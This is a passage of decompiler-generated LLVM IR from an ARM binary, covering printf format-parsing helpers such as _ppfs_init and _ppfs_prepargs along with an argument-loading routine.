  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_149ac.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_14fd8 = load i32, i32* @r4, align 4
  %v6_14fd8 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_14fe4 = load i32, i32* @r1, align 4
  store i32 %v0_14fe4, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_14ff0 = bitcast i32* %arg1 to i8*
  %v3_14ff0 = call i32 @__GI_memset(i8* %v2_14ff0, i32 0)
  store i32 %v3_14ff0, i32* %r0.global-to-local, align 4
  %v0_14ff4 = load i32, i32* @r4, align 4
  %v1_14ff4 = add i32 %v0_14ff4, 24
  %v2_14ff4 = inttoptr i32 %v1_14ff4 to i32*
  %v3_14ff4 = load i32, i32* %v2_14ff4, align 4
  store i32 %v3_14ff4, i32* %r3.global-to-local, align 4
  %v0_14ff8 = load i32, i32* @r5, align 4
  %v2_14ff8 = inttoptr i32 %v0_14ff4 to i32*
  store i32 %v0_14ff8, i32* %v2_14ff8, align 4
  %v0_14ffc = load i32, i32* %r3.global-to-local, align 4
  %v1_14ffc = add i32 %v0_14ffc, -1
  %v1_15000 = load i32, i32* @r4, align 4
  %v2_15000 = add i32 %v1_15000, 24
  %v3_15000 = inttoptr i32 %v2_15000 to i32*
  store i32 %v1_14ffc, i32* %v3_15000, align 4
  %v0_15004 = load i32, i32* @r4, align 4
  %v1_15004 = add i32 %v0_15004, 40
  store i32 %v1_15004, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_1501421 = inttoptr i32 %v1_15004 to i32*
  store i32 8, i32* %v2_1501421, align 4
  %v3_1501422 = load i32, i32* %r2.global-to-local, align 4
  %v4_1501423 = add i32 %v3_1501422, 4
  store i32 %v4_1501423, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15010.dec_label_pc_15010_crit_edge

dec_label_pc_15010.dec_label_pc_15010_crit_edge:  ; preds = %entry, %dec_label_pc_15010.dec_label_pc_15010_crit_edge
  %v4_1501424 = phi i32 [ %v4_1501423, %entry ], [ %v4_15014, %dec_label_pc_15010.dec_label_pc_15010_crit_edge ]
  %v0_15010.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15014.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15010 = add i32 %v0_15010.pre, -1
  store i32 %v1_15010, i32* %r3.global-to-local, align 4
  %v7_15010 = icmp eq i32 %v0_15010.pre, 1
  %v2_15014 = inttoptr i32 %v4_1501424 to i32*
  store i32 %v0_15014.pre, i32* %v2_15014, align 4
  %v3_15014 = load i32, i32* %r2.global-to-local, align 4
  %v4_15014 = add i32 %v3_15014, 4
  store i32 %v4_15014, i32* %r2.global-to-local, align 4
  br i1 %v7_15010, label %dec_label_pc_1501c, label %dec_label_pc_15010.dec_label_pc_15010_crit_edge

dec_label_pc_1501c:                               ; preds = %dec_label_pc_15010.dec_label_pc_15010_crit_edge
  %v0_1501c = load i32, i32* @r5, align 4
  store i32 %v0_1501c, i32* %r2.global-to-local, align 4
  %v1_1505c2 = inttoptr i32 %v0_1501c to i8*
  %v2_1505c3 = load i8, i8* %v1_1505c2, align 1
  %v3_1505c4 = zext i8 %v2_1505c3 to i32
  store i32 %v3_1505c4, i32* %r0.global-to-local, align 4
  %v2_150605 = icmp eq i8 %v2_1505c3, 0
  br i1 %v2_150605, label %dec_label_pc_15068, label %dec_label_pc_15024

dec_label_pc_15024:                               ; preds = %dec_label_pc_1501c, %dec_label_pc_1505c.backedge
  %v0_1502c = phi i32 [ %storemerge, %dec_label_pc_1505c.backedge ], [ %v0_1501c, %dec_label_pc_1501c ]
  %v0_15024 = phi i32 [ %v3_1505c, %dec_label_pc_1505c.backedge ], [ %v3_1505c4, %dec_label_pc_1501c ]
  %v7_15024 = icmp eq i32 %v0_15024, 37
  br i1 %v7_15024, label %dec_label_pc_1502c, label %dec_label_pc_15058

dec_label_pc_1502c:                               ; preds = %dec_label_pc_15024
  %v1_1502c = add i32 %v0_1502c, 1
  %v2_1502c = inttoptr i32 %v1_1502c to i8*
  %v3_1502c = load i8, i8* %v2_1502c, align 1
  %v4_1502c = zext i8 %v3_1502c to i32
  store i32 %v4_1502c, i32* %r3.global-to-local, align 4
  store i32 %v1_1502c, i32* %r2.global-to-local, align 4
  %v7_15030 = icmp eq i8 %v3_1502c, 37
  br i1 %v7_15030, label %dec_label_pc_15058, label %dec_label_pc_15038

dec_label_pc_15038:                               ; preds = %dec_label_pc_1502c
  %v1_15038 = load i32, i32* @r4, align 4
  %v2_15038 = inttoptr i32 %v1_15038 to i32*
  store i32 %v1_1502c, i32* %v2_15038, align 4
  %v0_1503c = load i32, i32* @r4, align 4
  store i32 %v0_1503c, i32* %r0.global-to-local, align 4
  %v1_15040 = inttoptr i32 %v0_1503c to i8*
  %v2_15040 = call i32 @_ppfs_parsespec(i8* %v1_15040)
  store i32 %v2_15040, i32* %r0.global-to-local, align 4
  %v1_15044 = icmp slt i32 %v2_15040, 0
  br i1 %v1_15044, label %dec_label_pc_1506c.loopexit, label %dec_label_pc_15050

dec_label_pc_15050:                               ; preds = %dec_label_pc_15038
  %v0_15050 = load i32, i32* @r4, align 4
  %v1_15050 = inttoptr i32 %v0_15050 to i32*
  %v2_15050 = load i32, i32* %v1_15050, align 4
  br label %dec_label_pc_1505c.backedge

dec_label_pc_15058:                               ; preds = %dec_label_pc_15024, %dec_label_pc_1502c
  %v0_15058 = phi i32 [ %v0_1502c, %dec_label_pc_15024 ], [ %v1_1502c, %dec_label_pc_1502c ]
  %v1_15058 = add i32 %v0_15058, 1
  br label %dec_label_pc_1505c.backedge

dec_label_pc_1505c.backedge:                      ; preds = %dec_label_pc_15058, %dec_label_pc_15050
  %storemerge = phi i32 [ %v1_15058, %dec_label_pc_15058 ], [ %v2_15050, %dec_label_pc_15050 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1505c = inttoptr i32 %storemerge to i8*
  %v2_1505c = load i8, i8* %v1_1505c, align 1
  %v3_1505c = zext i8 %v2_1505c to i32
  store i32 %v3_1505c, i32* %r0.global-to-local, align 4
  %v2_15060 = icmp eq i8 %v2_1505c, 0
  br i1 %v2_15060, label %dec_label_pc_1505c.dec_label_pc_15068_crit_edge, label %dec_label_pc_15024

dec_label_pc_1505c.dec_label_pc_15068_crit_edge:  ; preds = %dec_label_pc_1505c.backedge
  %v0_15068.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15068

dec_label_pc_15068:                               ; preds = %dec_label_pc_1505c.dec_label_pc_15068_crit_edge, %dec_label_pc_1501c
  %v0_15068 = phi i32 [ %v0_15068.pre, %dec_label_pc_1505c.dec_label_pc_15068_crit_edge ], [ %v0_1501c, %dec_label_pc_1501c ]
  %v1_15068 = load i32, i32* @r4, align 4
  %v2_15068 = inttoptr i32 %v1_15068 to i32*
  store i32 %v0_15068, i32* %v2_15068, align 4
  %v1_15074.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1506c

dec_label_pc_1506c.loopexit:                      ; preds = %dec_label_pc_15038
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1506c

dec_label_pc_1506c:                               ; preds = %dec_label_pc_1506c.loopexit, %dec_label_pc_15068
  %v1_15074 = phi i32 [ -1, %dec_label_pc_1506c.loopexit ], [ %v1_15074.pre, %dec_label_pc_15068 ]
  store i32 %v3_14fd8, i32* @r4, align 4
  store i32 %v6_14fd8, i32* @r5, align 4
  ret i32 %v1_15074

; uselistorder directives
  uselistorder i32 %v3_1505c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1501c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15014, { 1, 0 }
  uselistorder i32 %v0_15010.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 7, 3, 2, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 3, 4, 2, 6, 7, 0 }
  uselistorder i32 152, { 1, 0 }
  uselistorder label %dec_label_pc_15058, { 1, 0 }
  uselistorder label %dec_label_pc_15024, { 1, 0 }
  uselistorder label %dec_label_pc_15010.dec_label_pc_15010_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15078 = load i32, i32* @r4, align 4
  store i32 %v3_15078, i32* %stack_var_-12, align 4
  %v0_1507c = load i32, i32* @r0, align 4
  %v1_1507c = add i32 %v0_1507c, 24
  %v2_1507c = inttoptr i32 %v1_1507c to i32*
  %v3_1507c = load i32, i32* %v2_1507c, align 4
  store i32 %v3_1507c, i32* %r5.global-to-local, align 4
  store i32 %v0_1507c, i32* %r4.global-to-local, align 4
  %v2_1508c = add i32 %v0_1507c, 76
  %v3_1508c = inttoptr i32 %v2_1508c to i32*
  store i32 %arg2, i32* %v3_1508c, align 4
  %tmp5 = icmp slt i32 %v3_1507c, 1
  br i1 %tmp5, label %dec_label_pc_150b0, label %dec_label_pc_15094

dec_label_pc_15094:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15098 = load i32, i32* @r0, align 4
  %v2_15098 = add i32 %v1_15098, 8
  %v3_15098 = inttoptr i32 %v2_15098 to i32*
  store i32 0, i32* %v3_15098, align 4
  %v0_1509c = load i32, i32* %r5.global-to-local, align 4
  %v1_1509c = load i32, i32* @r0, align 4
  %v2_1509c = add i32 %v1_1509c, 28
  %v3_1509c = inttoptr i32 %v2_1509c to i32*
  store i32 %v0_1509c, i32* %v3_1509c, align 4
  %v0_150a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_150a0 = load i32, i32* @r0, align 4
  %v2_150a0 = add i32 %v1_150a0, 24
  %v3_150a0 = inttoptr i32 %v2_150a0 to i32*
  store i32 %v0_150a0, i32* %v3_150a0, align 4
  %v0_150a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_150a4 = load i32, i32* @r0, align 4
  %v2_150a4 = add i32 %v1_150a4, 4
  %v3_150a4 = inttoptr i32 %v2_150a4 to i32*
  store i32 %v0_150a4, i32* %v3_150a4, align 4
  %v0_150a8 = call i32 @_ppfs_setargs()
  store i32 %v0_150a8, i32* @r0, align 4
  %v0_150ac = load i32, i32* %r5.global-to-local, align 4
  %v1_150ac = load i32, i32* %r4.global-to-local, align 4
  %v2_150ac = add i32 %v1_150ac, 24
  %v3_150ac = inttoptr i32 %v2_150ac to i32*
  store i32 %v0_150ac, i32* %v3_150ac, align 4
  br label %dec_label_pc_150b0

dec_label_pc_150b0:                               ; preds = %entry, %dec_label_pc_15094
  %v2_150b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_150b4, i32* @r4, align 4
  %v1_150b8 = load i32, i32* @r0, align 4
  ret i32 %v1_150b8

; uselistorder directives
  uselistorder i32 %v0_1507c, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_150b0, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %v0_150bc = load i32, i32* @r0, align 4
  ret i32 %v0_150bc
}

define i32 @function_150c4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_150c4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_150c4 = load i32, i32* @r4, align 4
  store i32 %v3_150c4, i32* %stack_var_-8, align 4
  %v1_150c8 = add i32 %arg1, 8
  %v2_150c8 = inttoptr i32 %v1_150c8 to i32*
  %v3_150c8 = load i32, i32* %v2_150c8, align 4
  store i32 %v3_150c8, i32* %r3.global-to-local, align 4
  %v0_150cc = load i1, i1* @cpsr_z, align 1
  %v6_150d0 = icmp eq i32 %v3_150c8, -2147483648
  br i1 %v0_150cc, label %dec_label_pc_150d0, label %dec_label_pc_15208

dec_label_pc_150d0:                               ; preds = %dec_label_pc_150c4
  br i1 %v6_150d0, label %dec_label_pc_150d8, label %dec_label_pc_150d0.dec_label_pc_150f0_crit_edge

dec_label_pc_150d0.dec_label_pc_150f0_crit_edge:  ; preds = %dec_label_pc_150d0
  %.pre = add i32 %arg1, 80
  %.pre23 = add i32 %arg1, 76
  %.pre24 = inttoptr i32 %.pre23 to i32*
  br label %dec_label_pc_150f0

dec_label_pc_150d8:                               ; preds = %dec_label_pc_150d0
  %v1_150d8 = add i32 %arg1, 76
  %v2_150d8 = inttoptr i32 %v1_150d8 to i32*
  %v3_150d8 = load i32, i32* %v2_150d8, align 4
  store i32 %v3_150d8, i32* %r3.global-to-local, align 4
  %v1_150dc = inttoptr i32 %v3_150d8 to i32*
  %v2_150dc = load i32, i32* %v1_150dc, align 4
  store i32 %v2_150dc, i32* %r2.global-to-local, align 4
  %v1_150e0 = add i32 %v3_150d8, 4
  store i32 %v1_150e0, i32* %r3.global-to-local, align 4
  store i32 %v1_150e0, i32* %v2_150d8, align 4
  %v0_150e8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_150e8, i32* %v2_150c8, align 4
  %v0_150ec = load i32, i32* %r2.global-to-local, align 4
  %v2_150ec = add i32 %arg1, 80
  %v3_150ec = inttoptr i32 %v2_150ec to i32*
  store i32 %v0_150ec, i32* %v3_150ec, align 4
  br label %dec_label_pc_150f0

dec_label_pc_150f0:                               ; preds = %dec_label_pc_150d0.dec_label_pc_150f0_crit_edge, %dec_label_pc_150d8
  %v2_15100.pre-phi = phi i32* [ %.pre24, %dec_label_pc_150d0.dec_label_pc_150f0_crit_edge ], [ %v2_150d8, %dec_label_pc_150d8 ]
  %v1_150f8.pre-phi = phi i32 [ %.pre, %dec_label_pc_150d0.dec_label_pc_150f0_crit_edge ], [ %v2_150ec, %dec_label_pc_150d8 ]
  %v1_150f0 = add i32 %arg1, 4
  %v2_150f0 = inttoptr i32 %v1_150f0 to i32*
  %v3_150f0 = load i32, i32* %v2_150f0, align 4
  store i32 %v3_150f0, i32* %r3.global-to-local, align 4
  %v6_150f4 = icmp eq i32 %v3_150f0, -2147483648
  store i32 %v1_150f8.pre-phi, i32* %ip.global-to-local, align 4
  br i1 %v6_150f4, label %dec_label_pc_15100, label %dec_label_pc_15118

dec_label_pc_15100:                               ; preds = %dec_label_pc_150f0
  %v3_15100 = load i32, i32* %v2_15100.pre-phi, align 4
  store i32 %v3_15100, i32* %r3.global-to-local, align 4
  %v1_15104 = inttoptr i32 %v3_15100 to i32*
  %v2_15104 = load i32, i32* %v1_15104, align 4
  store i32 %v2_15104, i32* %r2.global-to-local, align 4
  %v1_15108 = add i32 %v3_15100, 4
  store i32 %v1_15108, i32* %r3.global-to-local, align 4
  store i32 %v1_15108, i32* %v2_15100.pre-phi, align 4
  %v0_15110 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_15110, i32* %v2_150f0, align 4
  %v0_15114 = load i32, i32* %r2.global-to-local, align 4
  %v3_15114 = inttoptr i32 %v1_150f8.pre-phi to i32*
  store i32 %v0_15114, i32* %v3_15114, align 4
  br label %dec_label_pc_15118

dec_label_pc_15118:                               ; preds = %dec_label_pc_150f0, %dec_label_pc_15100
  store i32 2055, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v1_151f8 = add i32 %arg1, 28
  %v2_151f8 = inttoptr i32 %v1_151f8 to i32*
  %v3_151f815 = load i32, i32* %v2_151f8, align 4
  store i32 %v3_151f815, i32* %r3.global-to-local, align 4
  %v5_1520017 = icmp sgt i32 %v3_151f815, %arg2
  br i1 %v5_1520017, label %dec_label_pc_15124, label %dec_label_pc_15204.loopexit

dec_label_pc_15124:                               ; preds = %dec_label_pc_15118, %dec_label_pc_151f8.backedge
  %v0_1513018 = phi i32 [ %v0_15130.be, %dec_label_pc_151f8.backedge ], [ %arg2, %dec_label_pc_15118 ]
  %v4_15124 = mul i32 %v0_1513018, 4
  %v5_15124 = add i32 %v4_15124, %arg1
  store i32 %v5_15124, i32* %r3.global-to-local, align 4
  %v1_15128 = add i32 %v5_15124, 40
  %v2_15128 = inttoptr i32 %v1_15128 to i32*
  %v3_15128 = load i32, i32* %v2_15128, align 4
  store i32 %v3_15128, i32* %r3.global-to-local, align 4
  %v7_1512c = icmp eq i32 %v3_15128, 8
  %v1_15130 = add i32 %v0_1513018, 1
  store i32 %v1_15130, i32* %lr.global-to-local, align 4
  br i1 %v7_1512c, label %dec_label_pc_151f8.backedge, label %dec_label_pc_15138

dec_label_pc_15138:                               ; preds = %dec_label_pc_15124
  %v3_15138 = load i32, i32* %v2_15100.pre-phi, align 4
  store i32 %v3_15138, i32* %r1.global-to-local, align 4
  %v8_1513c = icmp sgt i32 %v3_15128, 8
  br i1 %v8_1513c, label %dec_label_pc_15160, label %dec_label_pc_15140

dec_label_pc_15140:                               ; preds = %dec_label_pc_15138
  %v7_15140 = icmp eq i32 %v3_15128, 2
  br i1 %v7_15140, label %dec_label_pc_151b0, label %dec_label_pc_15148

dec_label_pc_15148:                               ; preds = %dec_label_pc_15140
  %v8_15148 = icmp sgt i32 %v3_15128, 2
  br i1 %v8_15148, label %dec_label_pc_15158, label %dec_label_pc_1514c

dec_label_pc_1514c:                               ; preds = %dec_label_pc_15148
  %v1_1514c = icmp slt i32 %v3_15128, 0
  br i1 %v1_1514c, label %dec_label_pc_151e4, label %dec_label_pc_151b0

dec_label_pc_15158:                               ; preds = %dec_label_pc_15148
  %v7_15158 = icmp eq i32 %v3_15128, 7
  br i1 %v7_15158, label %dec_label_pc_151c4, label %dec_label_pc_151e4

dec_label_pc_15160:                               ; preds = %dec_label_pc_15138
  %v7_15160 = icmp eq i32 %v3_15128, 1024
  br i1 %v7_15160, label %dec_label_pc_151b0, label %dec_label_pc_15168

dec_label_pc_15168:                               ; preds = %dec_label_pc_15160
  %v8_15168 = icmp sgt i32 %v3_15128, 1024
  br i1 %v8_15168, label %dec_label_pc_15180, label %dec_label_pc_1516c

dec_label_pc_1516c:                               ; preds = %dec_label_pc_15168
  switch i32 %v3_15128, label %dec_label_pc_151e4 [
    i32 256, label %dec_label_pc_151b0
    i32 512, label %dec_label_pc_151b0
  ]

dec_label_pc_15180:                               ; preds = %dec_label_pc_15168
  %v7_15180 = icmp eq i32 %v3_15128, 2048
  br i1 %v7_15180, label %dec_label_pc_15194, label %dec_label_pc_1518c

dec_label_pc_1518c:                               ; preds = %dec_label_pc_15180
  %v1_15188 = load i32, i32* %r4.global-to-local, align 4
  %v9_15188 = icmp eq i32 %v3_15128, %v1_15188
  br i1 %v9_15188, label %dec_label_pc_151c4, label %dec_label_pc_151e4

dec_label_pc_15194:                               ; preds = %dec_label_pc_15180
  %v1_15194 = add i32 %v3_15138, 7
  %v1_15198 = and i32 %v1_15194, -8
  store i32 %v1_15198, i32* %r3.global-to-local, align 4
  %v1_1519c = inttoptr i32 %v1_15198 to i32*
  %v2_1519c = load i32, i32* %v1_1519c, align 8
  store i32 %v2_1519c, i32* %r1.global-to-local, align 4
  %v3_1519c = or i32 %v1_15198, 4
  %v4_1519c = inttoptr i32 %v3_1519c to i32*
  %v5_1519c = load i32, i32* %v4_1519c, align 4
  store i32 %v5_1519c, i32* %r2.global-to-local, align 4
  %v1_151a0 = add i32 %v1_15198, 8
  store i32 %v1_151a0, i32* %r3.global-to-local, align 4
  store i32 %v1_151a0, i32* %v2_15100.pre-phi, align 4
  %v0_151a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_151a8 = inttoptr i32 %v0_151a8 to i32*
  %v2_151a8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_151a8, i32* %v1_151a8, align 4
  %v3_151a8 = add i32 %v0_151a8, 4
  %v4_151a8 = inttoptr i32 %v3_151a8 to i32*
  %v5_151a8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_151a8, i32* %v4_151a8, align 4
  br label %dec_label_pc_151f4

dec_label_pc_151b0:                               ; preds = %dec_label_pc_1516c, %dec_label_pc_1516c, %dec_label_pc_1514c, %dec_label_pc_15160, %dec_label_pc_15140
  %v1_151b0 = inttoptr i32 %v3_15138 to i32*
  %v2_151b0 = load i32, i32* %v1_151b0, align 4
  store i32 %v2_151b0, i32* %r2.global-to-local, align 4
  %v1_151b4 = add i32 %v3_15138, 4
  store i32 %v1_151b4, i32* %r3.global-to-local, align 4
  store i32 %v1_151b4, i32* %v2_15100.pre-phi, align 4
  %v0_151bc = load i32, i32* %r2.global-to-local, align 4
  %v1_151bc = load i32, i32* %ip.global-to-local, align 4
  %v2_151bc = inttoptr i32 %v1_151bc to i32*
  store i32 %v0_151bc, i32* %v2_151bc, align 4
  br label %dec_label_pc_151f4

dec_label_pc_151c4:                               ; preds = %dec_label_pc_15158, %dec_label_pc_1518c
  %v3_151c4 = load i32, i32* %v2_15100.pre-phi, align 4
  %v1_151c8 = add i32 %v3_151c4, 7
  %v1_151cc = and i32 %v1_151c8, -8
  store i32 %v1_151cc, i32* %r3.global-to-local, align 4
  %v1_151d0 = inttoptr i32 %v1_151cc to i32*
  %v2_151d0 = load i32, i32* %v1_151d0, align 8
  store i32 %v2_151d0, i32* %r1.global-to-local, align 4
  %v3_151d0 = or i32 %v1_151cc, 4
  %v4_151d0 = inttoptr i32 %v3_151d0 to i32*
  %v5_151d0 = load i32, i32* %v4_151d0, align 4
  store i32 %v5_151d0, i32* %r2.global-to-local, align 4
  %v1_151d4 = add i32 %v1_151cc, 8
  store i32 %v1_151d4, i32* %r3.global-to-local, align 4
  store i32 %v1_151d4, i32* %v2_15100.pre-phi, align 4
  %v0_151dc = load i32, i32* %ip.global-to-local, align 4
  %v1_151dc = inttoptr i32 %v0_151dc to i32*
  %v2_151dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_151dc, i32* %v1_151dc, align 4
  %v3_151dc = add i32 %v0_151dc, 4
  %v4_151dc = inttoptr i32 %v3_151dc to i32*
  %v5_151dc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_151dc, i32* %v4_151dc, align 4
  br label %dec_label_pc_151f4

dec_label_pc_151e4:                               ; preds = %dec_label_pc_1516c, %dec_label_pc_15158, %dec_label_pc_1514c, %dec_label_pc_1518c
  %v1_151e4 = add i32 %v3_15138, 4
  store i32 %v1_151e4, i32* %r3.global-to-local, align 4
  store i32 %v1_151e4, i32* %v2_15100.pre-phi, align 4
  %v0_151ec = load i32, i32* %r1.global-to-local, align 4
  %v1_151ec = inttoptr i32 %v0_151ec to i32*
  %v2_151ec = load i32, i32* %v1_151ec, align 4
  store i32 %v2_151ec, i32* %r3.global-to-local, align 4
  %v1_151f0 = load i32, i32* %ip.global-to-local, align 4
  %v2_151f0 = inttoptr i32 %v1_151f0 to i32*
  store i32 %v2_151ec, i32* %v2_151f0, align 4
  br label %dec_label_pc_151f4

dec_label_pc_151f4:                               ; preds = %dec_label_pc_151c4, %dec_label_pc_151b0, %dec_label_pc_15194, %dec_label_pc_151e4
  %v0_151f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_151f4 = add i32 %v0_151f4, 8
  store i32 %v1_151f4, i32* %ip.global-to-local, align 4
  %v0_151fc.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_151f8.backedge

dec_label_pc_151f8.backedge:                      ; preds = %dec_label_pc_151f4, %dec_label_pc_15124
  %v0_15130.be = phi i32 [ %v0_151fc.pre.pre, %dec_label_pc_151f4 ], [ %v1_15130, %dec_label_pc_15124 ]
  %v3_151f8 = load i32, i32* %v2_151f8, align 4
  store i32 %v3_151f8, i32* %r3.global-to-local, align 4
  %v5_15200 = icmp slt i32 %v0_15130.be, %v3_151f8
  br i1 %v5_15200, label %dec_label_pc_15124, label %dec_label_pc_151f8.dec_label_pc_15204.loopexit_crit_edge

dec_label_pc_15208:                               ; preds = %dec_label_pc_150c4
  br i1 %v6_150d0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15208
  %v2_1520c = add i32 %arg1, 36
  %v3_1520c = inttoptr i32 %v2_1520c to i8*
  %v4_1520c = load i8, i8* %v3_1520c, align 1
  %v5_1520c = zext i8 %v4_1520c to i32
  %v5_15210 = mul nuw nsw i32 %v5_1520c, 8
  %v6_15210 = add i32 %v5_15210, %arg1
  store i32 %v6_15210, i32* %r3.global-to-local, align 4
  %v2_15214 = add i32 %v6_15210, 72
  %v3_15214 = inttoptr i32 %v2_15214 to i32*
  %v4_15214 = load i32, i32* %v3_15214, align 4
  store i32 %v4_15214, i32* %r3.global-to-local, align 4
  store i32 %v4_15214, i32* %v2_150c8, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15208, %bb
  %v1_1521c = add i32 %arg1, 4
  %v2_1521c = inttoptr i32 %v1_1521c to i32*
  %v3_1521c = load i32, i32* %v2_1521c, align 4
  store i32 %v3_1521c, i32* %r3.global-to-local, align 4
  %v6_15220 = icmp eq i32 %v3_1521c, -2147483648
  br i1 %v6_15220, label %bb14, label %dec_label_pc_15204

bb14:                                             ; preds = %.thread1
  %v2_15224 = add i32 %arg1, 37
  %v3_15224 = inttoptr i32 %v2_15224 to i8*
  %v4_15224 = load i8, i8* %v3_15224, align 1
  %v5_15224 = zext i8 %v4_15224 to i32
  %v5_15228 = mul nuw nsw i32 %v5_15224, 8
  %v6_15228 = add i32 %v5_15228, %arg1
  store i32 %v6_15228, i32* %r3.global-to-local, align 4
  %v2_1522c = add i32 %v6_15228, 72
  %v3_1522c = inttoptr i32 %v2_1522c to i32*
  %v4_1522c = load i32, i32* %v3_1522c, align 4
  store i32 %v4_1522c, i32* %r3.global-to-local, align 4
  store i32 %v4_1522c, i32* %v2_1521c, align 4
  br label %dec_label_pc_15204

dec_label_pc_151f8.dec_label_pc_15204.loopexit_crit_edge: ; preds = %dec_label_pc_151f8.backedge
  br label %dec_label_pc_15204.loopexit

dec_label_pc_15204.loopexit:                      ; preds = %dec_label_pc_151f8.dec_label_pc_15204.loopexit_crit_edge, %dec_label_pc_15118
  br label %dec_label_pc_15204

dec_label_pc_15204:                               ; preds = %dec_label_pc_15204.loopexit, %.thread1, %bb14
  %v3_15234 = load i32, i32* %v2_150c8, align 4
  store i32 %v3_15234, i32* %r1.global-to-local, align 4
  %v1_15238 = icmp slt i32 %v3_15234, 0
  br i1 %v1_15238, label %dec_label_pc_15240, label %dec_label_pc_15260

dec_label_pc_15240:                               ; preds = %dec_label_pc_15204
  %v1_15240 = add i32 %arg1, 16
  %v2_15240 = inttoptr i32 %v1_15240 to i32*
  %v3_15240 = load i32, i32* %v2_15240, align 4
  %v1_15248 = sub i32 0, %v3_15234
  store i32 %v1_15248, i32* %r1.global-to-local, align 4
  %v1_15244 = and i32 %v3_15240, -10
  %v1_1524c = or i32 %v1_15244, 8
  store i32 %v1_1524c, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_15254 = add i32 %arg1, 20
  %v3_15254 = inttoptr i32 %v2_15254 to i32*
  store i32 32, i32* %v3_15254, align 4
  %v0_15258 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15258, i32* %v2_150c8, align 4
  %v0_1525c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1525c, i32* %v2_15240, align 4
  br label %dec_label_pc_15260

dec_label_pc_15260:                               ; preds = %dec_label_pc_15204, %dec_label_pc_15240
  %v2_15260 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15260, i32* %r4.global-to-local, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v0_15130.be, { 1, 0 }
  uselistorder i32 %v3_15138, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v3_15128, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_1513018, { 1, 0 }
  uselistorder i32* %v2_151f8, { 1, 0 }
  uselistorder i32 %v1_150f8.pre-phi, { 1, 0 }
  uselistorder i32* %v2_15100.pre-phi, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %v2_150c8, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 0 }
  uselistorder i32 %arg1, { 11, 8, 13, 1, 15, 14, 2, 9, 3, 12, 7, 5, 6, 0, 4, 10 }
  uselistorder label %dec_label_pc_15260, { 1, 0 }
  uselistorder label %dec_label_pc_15204, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_151f4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_151e4, { 3, 0, 1, 2 }
